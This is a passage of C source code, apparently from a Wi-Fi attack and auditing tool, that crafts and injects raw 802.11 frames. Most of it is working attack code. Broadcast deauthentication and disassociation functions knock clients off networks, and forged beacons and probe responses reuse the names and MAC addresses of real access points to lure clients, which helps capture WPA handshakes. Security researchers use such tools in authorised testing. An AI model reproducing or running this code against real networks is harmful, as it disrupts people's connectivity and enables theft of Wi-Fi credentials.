memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
if((zeiger->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x17] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x1d] = CS_CCMP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x23] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x23] = TAK_PSKSHA256;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE) < 0)
	{
	perror("\nfailed to transmit associationrequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa1(maclist_t *zeiger)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa1data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* pairwise cipher */
0x01, 0x00,  /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA1_SIZE sizeof(associationrequestwpa1data)

if(filtermode == 1)
	{
	if(isapinfilterlist(zeiger->addr) == true) return;
	}
else if(filtermode ==2)
	{
	if(isapinfilterlist(zeiger->addr) == false) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, zeiger->addr, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, zeiger->addr, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE], &associationrequestwpa1data, ASSOCIATIONREQUESTWPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x1b] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x21] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x27] = AK_PSK;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA1_SIZE) < 0)
	{
	perror("\nfailed to transmit associationrequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_authentication_resp_opensystem()
{
static mac_t *macftx;

static const uint8_t authenticationresponsedata[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define AUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

if(filtermode == 1)
	{
	if(isclientinfilterlist(macfrx->addr2) == true) return;
	}
else if(filtermode ==2)
	{
	if(isclientinfilterlist(macfrx->addr2) == false) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationresponsedata, AUTHENTICATIONRESPONSE_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE) < 0)
	{
	perror("\nfailed to transmit authenticationresponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_authentication_req_opensystem(uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t authenticationrequestdata[] =
{
0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

if(filtermode == 1)
	{
	if(isapinfilterlist(macap) == true) return;
	}
else if(filtermode ==2)
	{
	if(isapinfilterlist(macap) == false) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE) < 0)
	{
	perror("\nfailed to transmit authenticationrequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_probe_resp(uint8_t *myap, uint8_t essidlen, uint8_t *essid)
{
static mac_t *macftx;
static capap_t *capap;

const uint8_t proberesponsedata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA1 & WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

if(filtermode == 1)
	{
	if(isclientinfilterlist(macfrx->addr2) == true) return;
	}
else if(filtermode ==2)
	{
	if(isclientinfilterlist(macfrx->addr2) == false) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +ESSID_LEN_MAX +IETAG_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, myap, 6);
memcpy(macftx->addr3, myap, 6);
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], essid, essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen], &proberesponsedata, PROBERESPONSE_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen +0x0c] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen +PROBERESPONSE_SIZE) < 0)
	{
	perror("\nfailed to transmit proberesponse");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_beacon_aplist()
{
static mac_t *macftx;
static capap_t *capap;

static const uint8_t reactivebeacondata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA1 & WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0xc0,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REACTIVEBEACON_SIZE sizeof(reactivebeacondata)

if(aplist->timestamp == 0) return;
if(beaconintptr >= aplist +MACLIST_MAX) beaconintptr = aplist;
if(beaconintptr->timestamp == 0) beaconintptr = aplist;
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +REACTIVEBEACON_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, beaconintptr->addr, 6);
memcpy(macftx->addr3, beaconintptr->addr, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = beaconintptr->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], beaconintptr->essid, beaconintptr->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +beaconintptr->essidlen], &reactivebeacondata, REACTIVEBEACON_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +beaconintptr->essidlen +0x0c] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +beaconintptr->essidlen +REACTIVEBEACON_SIZE) < 0)
	{
	perror("\nfailed to transmit internal beacon");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
beaconintptr++;
return;
}
/*===========================================================================*/
static void send_beacon_reactive(uint8_t *myap, uint8_t essidlen, uint8_t *essid)
{
static mac_t *macftx;
static capap_t *capap;

static const uint8_t reactivebeacondata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: Traffic Indication Map (TIM): DTIM 1 of 0 bitmap */
0x05, 0x04, 0x01, 0x02, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA1 & WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x0c,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REACTIVEBEACON_SIZE sizeof(reactivebeacondata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +REACTIVEBEACON_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, myap, 6);
memcpy(macftx->addr3, myap, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], essid, essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen], &reactivebeacondata, REACTIVEBEACON_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen +0x0c] = channelscanlist[cpa];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen +REACTIVEBEACON_SIZE) < 0)
	{
	perror("\nfailed to transmit internal beacon");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_proberequest_directed(uint8_t *macap, int essid_len, uint8_t *essid)
{
static mac_t *macftx;

static const uint8_t directedproberequestdata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define DIRECTEDPROBEREQUEST_SIZE sizeof(directedproberequestdata)

if(filtermode == 1)
	{
	if(isapinfilterlist(macap) == true) return;
	}
else if(filtermode ==2)
	{
	if(isapinfilterlist(macap) == false) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +DIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, macap, 6);
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +1] = essid_len;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE], essid, essid_len);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len], &directedproberequestdata, DIRECTEDPROBEREQUEST_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len +DIRECTEDPROBEREQUEST_SIZE) < 0)
	{
	perror("\nfailed to transmit directed proberequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_proberequest_directed_broadcast(int essid_len, uint8_t *essid)
{
static mac_t *macftx;

static const uint8_t directedproberequestdata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define DIRECTEDPROBEREQUEST_SIZE sizeof(directedproberequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +DIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, &mac_broadcast, 6);
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +1] = essid_len;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE], essid, essid_len);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len], &directedproberequestdata, DIRECTEDPROBEREQUEST_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len +DIRECTEDPROBEREQUEST_SIZE) < 0)
	{
	perror("\nfailed to transmit directed proberequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void send_proberequest_undirected_broadcast()
{
static mac_t *macftx;

static const uint8_t undirectedproberequestdata[] =
{
0x00, 0x00,
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x92, 0x98, 0xa4,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +UNDIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, &mac_broadcast, 6);
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE) < 0)
	{
	perror("\nfailed to transmit undirected proberequest");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
/*===========================================================================*/
static void send_disassociation(uint8_t *macsta, uint8_t *macap, uint8_t reason)
{
static mac_t *macftx;
static maclist_t *zeiger;

if(filtermode == 1)
	{
	if(isapinfilterlist(macap) == true) return;
	}
else if(filtermode ==2)
	{
	if(isapinfilterlist(macap) == false) return;
	}
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->addr, macap, 6) != 0) continue;
	if(zeiger->status > NET_M2) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DISASSOC;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydisassociationsequence++ << 4;
if(mydisassociationsequence >= 4096) mydisassociationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(write(fd_socket, packetoutptr,  HDRRT_SIZE +MAC_SIZE_NORM +2) < 0)
	{
	perror("\nfailed to transmit deuthentication");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_deauthentication_broadcast(uint8_t *macap, uint8_t reason)
{
static mac_t *macftx;
static maclist_t *zeiger;

if(filtermode == 1)
	{
	if(isapinfilterlist(macap) == true) return;
	}
else if(filtermode ==2)
	{
	if(isapinfilterlist(macap) == false) return;
	}
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->addr, macap, 6) != 0) continue;
	if(zeiger->status > NET_M2) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydeauthenticationsequence++ << 4;
if(mydeauthenticationsequence >= 4096) mydeauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(write(fd_socket, packetoutptr,  HDRRT_SIZE +MAC_SIZE_NORM +2) < 0)
	{
	perror("\nfailed to transmit deuthentication");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static void send_ack()
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_ACK+1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_CTL;
macftx->subtype = IEEE80211_STYPE_ACK;
memcpy(macftx->addr1, macfrx->addr2, 6);
if(write(fd_socket, packetoutptr,  HDRRT_SIZE +MAC_SIZE_ACK) < 0)
	{
	perror("\nfailed to transmit acknowledgement");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline maclist_t *getnet(uint8_t *ap)
{
static maclist_t *zeiger;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return NULL;
	if(memcmp(zeiger->addr, ap, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	return zeiger;
	}
return NULL;
}
/*===========================================================================*/
static inline void gettagwpa(int wpalen, uint8_t *ieptr, tags_t *zeiger)
{
static int c;
static wpaie_t *wpaptr;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;

wpaptr = (wpaie_t*)ieptr;
wpalen -= WPAIE_SIZE;
ieptr += WPAIE_SIZE;
if(memcmp(wpaptr->oui, &mscorp, 3) != 0) return;
if(wpaptr->ouitype != 1) return;
if(wpaptr->type != VT_WPA_IE) return;
zeiger->kdversion |= KV_WPAIE;
gsuiteptr = (suite_t*)ieptr; 
if(memcmp(gsuiteptr->oui, &mscorp, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) zeiger->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) zeiger->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) zeiger->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) zeiger->groupcipher |= TCS_CCMP;
